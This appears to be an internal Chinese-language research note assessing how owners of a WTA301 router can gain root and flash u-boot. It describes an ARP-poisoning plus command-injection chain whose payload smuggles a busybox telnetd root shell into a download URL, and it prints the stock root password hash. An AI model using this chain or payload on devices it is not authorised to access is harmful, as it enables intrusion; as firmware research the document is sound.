# 普通用户能不能刷 u-boot —— getroot 链评估

日期：2026-11-06
起因：用户切回原厂系统后问「getroot 怎么获取 root，这决定了普通用户刷新 uboot」。

**结论：getroot 能让**技术用户**免 TTL 拿 root，但**不能**成为普通用户刷 u-boot 的路径。
普通用户第一次刷 u-boot，目前只有 TTL 一条路。**

证据分档：`[本板实证]` 本机镜像/脚本 · `[外部实证]` 可复核的外部原文 ·
`[文档实证]` 本仓库既有文档已结论化的内容 · `[推断]` 有推理链未实测。

---

## 1. getroot 怎么拿 root（文档已有完整复现链）

出处 `work/docs/02-ROOT-获取.md` + `work/docs/archive-md/ROOT-SHELL-复现手册.md`。
脚本在 `work/net/`（`getroot.py` `poison.py` `elink_gw4.py` `srv.py`），
备份工具在 `work/_archive/scripts/`（`listener.py` `tsh.py` `check_env.py` 等，均已核实存在）。

### 1.1 一条命令

```bash
python getroot.py        # 自动找 IP/MAC + 配伪装地址 + 起三件套 + 验证 uid=0
```

成功后 `telnet <IP> 2323` 直接是 `uid=0(root)`，无用户名密码。

### 1.2 原理链（六环，每环有原文出处）

`[文档实证]`：

1. 设备上 `elinkclt` 周期性（约 4 分钟，失败 3 次退避）**主动反连「网关」** `192.168.0.1:32768`
2. 用 **ARP 毒化**把设备眼里的 `192.168.0.1` 抢到 PC 身上（`poison.py`）
3. 握手：DH 128 位 + AES-128-CBC（IV 固定 0），帧格式
   `[BE u32 magic 0x3f721fb5][len][payload]`；**`data` 必须是数组、`message` 必须是对象**
4. 连上后发 `ubus_call ctcapd.appd install '{"url":"..."}'` → appd 走 `_download_app@0x15180`
5. appd 用 `asprintf`（`0x1530c/0x15334`）拼 `wget <url>` 再 `popen@0x151b4`，
   **URL 未过滤 `;`** ⇒ 命令注入
6. payload：`http://<PC_IP>:8099/x;(/bin/busybox telnetd -l /bin/sh -p 2323 ...)`

注入点落在 `appd` 里，而 appd 以 root 跑 ⇒ 拿到的就是 root。

### 1.3 前置条件（这是它「不是普通用户路径」的原因）

`[文档实证]` 手册 §2：

| 条件 | 要求 |
|---|---|
| 拓扑 | **WTA301 处于 repeater（中继）模式**，`workmode` 实测为 `repeater` |
| 设备地址 | 原成功案例是 `192.168.0.152`（上游网关 `192.168.0.1`） |
| PC 连接 | PC **只连 WTA301 自己的 WiFi** |
| 网卡别名 | 必须给 WLAN 加 `192.168.0.1/32`（`skipassource=true`） |
| 依赖 | Python 3.12 + `scapy 2.8.0` + **Npcap**（WinPcap 兼容模式）+ `cryptography` |
| 能力 | 需要能伪造 ARP（同 WLAN 内即可） |

### 1.4 `elinkclt` 连哪两个地址

`[文档实证]` 手册 §4.4 原文：
> 2. SSDP 失败后**直接连硬编码的网关 IP**：`192.168.0.1:32768` 和 `192.168.1.1:32768` 交替

---

## 2. ★ 当前拓扑下这条路不成立（必须先说清）

`[本板实证]` 2026-11-06 从笔记本（`192.168.1.100`，有线接 LAN1）探测：

```
  OK   192.168.1.1      <- 原厂系统在线
  FAIL 192.168.0.1
  FAIL 192.168.0.152
```

即设备现在是**路由模式、IP 192.168.1.1**，而不是文档成功时的**中继模式 192.168.0.152**。

`[推断]` 由此：

- `elinkclt` 会连 `192.168.1.1:32768`，但那就是**它自己**（br-lan 持有该地址），
  报文不会走到我们 PC ⇒ 端口 32768 的监听抓不到东西。
- 更关键：给 PC 加 `192.168.0.1/32` 别名也无效，因为设备当前网段是 `192.168.1.0/24`，
  它不会去 ARP 一个不存在的 `192.168.0.1`。

**⇒ 要用 getroot，得先把设备改回中继模式、跑到 `192.168.0.x` 网段，PC 改连设备自己的 WiFi。**
这会改变网络环境，属于需要用户决定的操作，不能默认执行。

---

## 3. 原厂固件里的其它提权路径（全部走不通）

### 3.1 开 telnet：能开，但拿不到 root

`[本板实证]` 解包 `work/stock/rootfs202`：

`etc/init.d/telnet` 是**标准 OpenWrt 脚本**（`Copyright (C) 2006-2011 OpenWrt.org`），
逻辑是「没有 ssh 公钥且 root 无密码 ⇒ 起 telnetd」。

真正决定账号的是 `bin/telnet_check.sh`（`/etc/rc.d/S99telnet_check` 启动）：

```sh
TELNET_FILE="/tmp/etc/config/custom_system.json"
# 等 dms 写出这个文件
user=$(... user_name ...)
telnet_enable_switch=$(... enable ...)
encrypt_passwd=$(... crypt_passwd ...)
sed -i "${line_num}d" $PWD_FILE                      # 删旧的 :503:503: 行
echo "$user:$encrypt_passwd:503:503:$user:/home:/bin/ash" >> $PWD_FILE
/etc/init.d/telnet start
```

⇒ **账号 UID=503，不是 0。** 且 `[外部实证]` 恩山实测原文：
> 照着我给的文档打开telnet连上后，进入的是tp自己写的一个shell，psh，权限非常低，
> 不能路径补全，连元字符都不支持，唯一有用的是一个加密的goash命令，
> 要把它给出的字符串用TP的私钥进行加密，再BASE64编码，才能进入完整的SHELL。

`[本板实证]` 印证：`sbin/psh`（84244 B）内含 `goashcmd` / `rsa_verify` 符号。

`[本板实证]` **原厂 rootfs 里没有任何 SUID 二进制**：
```
$ find . -perm -4000 -type f
（空）
```
⇒ 从 uid 503 提到 root 没有现成跳板。

`[本板实证]` root 密码存在但不可用（非空即脚本不启 telnetd）：
```
etc/passwd: root:$1$3FHymwGr$mCqCCUAOcmiefgcrgrvMZ.:0:0:root:/root:/bin/ash
etc/shadow: root:x:0:0:99999:7:::
```
`etc/rc.d/` 里**没有** `dropbear`/`sshd`，也没有 dropbear 二进制。

### 3.2 原厂 u-boot 网页恢复：存在，但拒收我们的固件

`[本板实证]` `mtd0_factory_boot.bin`（0x3c0000）里含**完整 Web 恢复界面**，
型号串 `Init("WTA301", "1.1",120000)`，关键字符串（两份，偏移差正好 0x80000）：

```
0x2f38b9 / 0x3738b9  Firmware check failed! Enter recovery mode.
0x2f6c24 / 0x376c24  httpd	- start www server for firmware recovery
0x2fce94 / 0x37ce94  firmware check finished, ok to upgrade
0x2fd02b / 0x37d02b  Web failsafe mode aborted!
```

`[文档实证]` `work/docs/final/12-原厂固件反汇编结论汇编.md` §2 已给结论：
> - 触发：**双镜像验签全失败自动进入**（`0x4a927ab0` 返回 <0 → "Firmware check failed! Enter recovery mode." @`0x4a9708b8` → `run_command("httpd")`）
> - 服务：u-boot IP=`192.168.1.1`，PC 需接 LAN 口；120 秒无上传则 "Web failsafe mode aborted!"
> - 上传：POST /，表单上传 .bin；**要求 TP 私有头 + RSA 签名 + HwID 匹配**
>   （"firmware support my HwID" @`0x4a979e06`）
> - 上传后：`SerialFirmware` 系列函数写 flash
> - **无串口救援的唯一路径**（tftpboot 等需串口命令行）

⇒ **RSA 签名这一关过不去**，我们自编的 u-boot / 固件传不上去。
而触发它还需要先让两个镜像都验签失败 —— 那本身就要写 flash。

### 3.3 原厂二级 u-boot：无网页、无 telnet、bootdelay 是 0

`[本板实证]` `strings mtd4_normal_boot.uboot.bin`，命令集只有：

```
nand(73) bootipq(4) tftpput(2) tftpboot(1) tftp(1)
```

**没有** `httpd`、`tplflash`、`telnetd`、`wget`，也没有任何 `failsafe`/`web` 痕迹。
且 `bootdelay=0`、`bootcmd=bootipq` ⇒ 不给打断窗口。

`[文档实证]` `work/docs/04-U-BOOT-引导链逆向.md` §1：
> 一级 u-boot … "input <abort key> to stop autoboot in 500 ms" ← **人手按不到**

---

## 4. 结论：普通用户刷 u-boot 的可行性矩阵

| 用户当前状态 | 能否刷 u-boot | 途径 |
|---|---|---|
| **原厂固件** | ❌ 不能（无 TTL） | 网页恢复要 RSA 签名；telnet 只给 uid 503 + psh；无 SUID |
| 原厂固件 + 中继拓扑 + 会用 scapy | ⚠️ 能 | `getroot.py` 拿 root → 系统内写 flash |
| **已在我们 OpenWrt 上** | ✅ 能 | 本来就是 root，`mtd write` + 重算 TP 头 `+0x90` |
| 有 TTL 串口 | ✅ 能 | `tpluboot ... write`（P18 §7，一次性） |

**⇒ 对开源发布的口径**：首次刷机 = **必须 TTL**（拆机接线）。
P18 §7 原话「**这是最后一次需要 TTL 的刷写**」的前提，是「已经装上我们的 kit」。
对全新用户不成立。

`[文档实证]` `src/README-WTA301.md` §10 安全红线也确认了救援面：
> **无 usb/ums/sd 命令 ⇒ 硬件救援只有串口。**

---

## 5. 要把普通用户的门槛降下来，只有三条路（都未做）

| 路 | 内容 | 风险/成本 |
|---|---|---|
| A | 把 `getroot.py` 做成图形化一键包（含 Npcap 静默安装、自动切中继） | 仍需中继拓扑；杀软易拦 ARP 毒化 |
| B | 找原厂 dms 的未授权接口（绕过 RSA） | 未验证；可能有 CVE，但属攻击面研究 |
| C | 接受「首次必须 TTL」，写清前置条件 | 诚实、成本最低；但用户流失 |

本文档不推荐 A/B 作为默认路径，也不声称它们可做 —— 均未实测。

---

## 6. 未验证项（不许当结论用）

| 项 | 状态 |
|---|---|
| 当前 192.168.1.1 路由模式下 `getroot.py` 实际跑一遍 | ⬜ 未做（需改网络环境，要用户决定） |
| dms `/custom_system/telnet/telnet` 调用后能否改 UID | ⬜ 未做，仅知脚本硬编码 503 |
| 原厂 Web 恢复的 RSA 校验是否可绕过（如降级到老固件） | ⬜ 未做 |
| 一级 u-boot 两份镜像（偏移差 0x80000）的 A/B 语义 | ⬜ 已知存在两份，未验证切换逻辑 |

